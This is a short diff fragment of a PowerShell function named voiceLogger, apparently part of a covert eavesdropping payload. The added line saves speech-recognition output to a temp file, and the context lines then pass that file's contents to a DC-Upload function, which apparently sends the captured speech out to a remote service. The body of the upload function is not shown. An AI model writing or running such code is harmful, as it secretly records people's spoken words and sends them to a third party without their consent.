@@ -32,6 +32,7 @@ function voiceLogger {
             $results = $result.Text
             Write-Output $results
             $log = "$env:tmp/VoiceLog.txt"
+	    echo $results > $log
             $text = get-content $log -raw
             DC-Upload $text
 
